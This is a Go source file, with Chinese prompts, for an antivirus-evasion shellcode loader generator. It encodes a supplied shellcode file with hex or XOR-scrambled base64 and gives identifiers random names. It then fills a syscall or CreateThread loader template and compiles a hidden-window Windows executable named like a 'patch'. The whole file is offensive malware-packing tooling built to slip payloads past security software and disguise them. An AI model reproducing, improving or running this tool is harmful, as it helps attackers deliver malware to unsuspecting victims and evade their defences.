package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	key          []byte
	keys         string
	keyName      string
	decodeName   string
	genName      string
	gd           string
	bbdataName   string
	shellCodeHex string
	shellcodeStr string
)

var path = "payload.bin"
var tmplMap = make(map[string]string)
var encodeMap = make(map[string]string)

var path1 string
var hide1 string
var gostrip1 string
var isRm1 string
var tpl string
var encode string
var hide = true
var gostrip bool
var isRm = true
var tmplVal = "syscall"
var encodeVal = "hex"

const tmplHelp = `
1. syscall
2. createThread
`

const encodeHelp = `
1. hex
2. base64
`

var decodeMethod = `
func $getDeCode(string2 string) []byte {
	ss, _ := $encode$.DecodeString(string2)
	string2 = string(ss)
	var code []byte
	bydata := []byte(string2)
	for i := 0; i < len(bydata); i++ {
		code = append(code, bydata[i]^$keyName[0]^$keyName[1])
	}
	ssb, _ := $encode$.DecodeString(string(code))
	return ssb
}
`

var decodeMethod1 = `
func $getDeCode(code string) []byte {
	ssb, _ := $encode$.DecodeString(string(code))
	return ssb
}
`

func init() {
	fmt.Println("[*]初始化混淆参数")
	//初始化key
	key = getKey()
	//key变量名
	keyName = randString(5)
	//解码方法名
	decodeName = randString(6)
	//生成exe方法名
	genName = randString(6)
	//混淆方法名
	gd = randString(6)

	//base64变量
	bbdataName = randString(4)

	shellCodeHex = randString(4)

	tmplMap["1"] = "syscall"
	tmplMap["2"] = "createThread"

	encodeMap["1"] = "hex"
	encodeMap["2"] = "base64"
}

func getKey() []byte {
	keys = randString(2)
	b := []byte(keys)
	return b
}

func randString(l int) string {
	str := "abcdefghijklmnopqrstuvwxyz_ASDFGJHKLIUYTREWCVBMNKLOIPZXAQ"
	bytes := []byte(str)
	result := []byte{}
	x := time.Now().UnixNano() * 6
	y := time.Now().UnixNano() * 4
	r := rand.New(rand.NewSource(x + y))
	time.Sleep(1000)
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	ddd := string(result)
	fmt.Println(ddd)
	return ddd
}

func getBase64EnCode(data []byte) string {
	bdata1 := base64.StdEncoding.EncodeToString(data)
	bydata1 := []byte(bdata1)
	var shellcode []byte

	for i := 0; i < len(bydata1); i++ {
		shellcode = append(shellcode, bydata1[i]^key[0]^key[1])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

func getHexEnCode(data []byte) string {
	/*	var shellcode []byte
		for i := 0; i < len(data); i++ {
			shellcode = append(shellcode, data[i]^key[0]^key[1])
		}*/
	return hex.EncodeToString(data)
}

func gen(code *string) {

	*code = strings.ReplaceAll(*code, "$method$", decodeMethod)

	if encodeVal == "hex" {
		*code = strings.ReplaceAll(*code, "\"encoding/base64\"", "")
	} else {
		*code = strings.ReplaceAll(*code, "\"encoding/hex\"", "")
	}
	//payload
	*code = strings.ReplaceAll(*code, "$bdata", shellcodeStr)
	//payload名
	*code = strings.ReplaceAll(*code, "$bbdata", bbdataName)
	*code = strings.ReplaceAll(*code, "$keyName", keyName)
	*code = strings.ReplaceAll(*code, "$keys", keys)
	*code = strings.ReplaceAll(*code, "$shellCodeHex", shellCodeHex)
	*code = strings.ReplaceAll(*code, "$gd", gd)
	//*code=strings.ReplaceAll(*code, "$gdNum", ss)
	*code = strings.ReplaceAll(*code, "$genEXE", genName)
	*code = strings.ReplaceAll(*code, "$getDeCode", decodeName)

}

func main() {

	var m bool
	if len(os.Args) == 2 {
		fp := os.Args[1]
		_, err := os.Stat(fp)
		if err == nil {
			m = true
		}
	}

	//高级模式
	if !m {
		fmt.Println("[*]请输入shellcode路径 [默认./payload.bin]")
		fmt.Scanln(&path1)
		if strings.TrimSpace(path1) != "" {
			path = path1
		}
		fmt.Println("[*]请选择免杀方式 [默认1]")
		fmt.Println(tmplHelp)
		fmt.Scanln(&tpl)
		if strings.TrimSpace(tmplMap[tpl]) != "" {
			tmplVal = tmplMap[tpl]
		}

		fmt.Println("[*]请选择编码方式 [默认1]")
		fmt.Println(encodeHelp)
		fmt.Scanln(&encode)
		if strings.TrimSpace(encodeMap[encode]) != "" {
			encodeVal = encodeMap[encode]
		}

		fmt.Println("[*]是否隐藏窗口? [Y/n]")
		fmt.Scanln(&hide1)
		if hide1 == "n" {
			hide = false
		}

		/*		fmt.Println("[*]是否去除golang特征? [y/N]")
				fmt.Scanln(&gostrip1)
				if gostrip1 == "y" {
					gostrip = true
				}*/

		fmt.Println("[*]是否删除生成shellcode? [Y/n]")
		fmt.Scanln(&isRm1)
		if isRm1 == "n" {
			isRm = false
		}

		fmt.Println("===============================")

		time.Sleep(1 * time.Second)

	}
	sc, err := ioutil.ReadFile(path)
	if err != nil || len(sc) == 0 {
		fmt.Println("[-]请检查输入shellcode路径!")
		return
	}

	//根据编码生成shellcode
	if encodeVal == "hex" {
		shellcodeStr = getHexEnCode(sc)
		decodeMethod = decodeMethod1
		decodeMethod = strings.ReplaceAll(decodeMethod, "$encode$", "hex")
	} else {
		shellcodeStr = getBase64EnCode(sc)
		decodeMethod = strings.ReplaceAll(decodeMethod, "$encode$", "base64.StdEncoding")
	}

	fmt.Println("[+]获取payload", "---->", path)
	//fmt.Println(bdata)
	time.Sleep(1 * time.Second)
	fmt.Println("[*]编码方式", "---->", encodeVal)
	time.Sleep(1 * time.Second)
	//ioutil.WriteFile("shellcode.txt", []byte(bdata), 0666)
	fmt.Println("[*]解析shellcode模板", "---->", tmplVal)
	time.Sleep(1 * time.Second)
	//tmpl, _ := ioutil.ReadFile("./syscal")
	tmpl, _ := ioutil.ReadFile("template/" + tmplVal)
	fmt.Println(tmpl)
	code := string(tmpl)
	fmt.Println("[*]生成shellcode", "---->shellcode.go")
	time.Sleep(1 * time.Second)

	gen(&code)
	ioutil.WriteFile("shellcode.go", []byte(code), 0666)

	fmt.Println("[*]编译shellcode")
	time.Sleep(1 * time.Second)

	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o game.exe ./shellcode.go")
	//隐藏窗口，如有需要自行替换
	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
	//CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go
	outFile := "patch" + string(time.Now().Format("200612150405")) + ".exe"
	//outFile := "patch.exe"
	var cmd exec.Cmd
	if hide {
		//cmd = *exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-H windowsgui -s -w", "shellcode.go", "-o game"+outFile)
		cmd = *exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o "+outFile+" ./shellcode.go")
	} else {
		cmd = *exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o "+outFile+" ./shellcode.go")
	}
	//阻塞至等待命令执行完成
	err1 := cmd.Run()
	if err1 != nil {
		panic(err1)
	}
	fmt.Println("[+]生成文件" + outFile)
	if isRm {
		os.Remove("shellcode.go")
	}

}
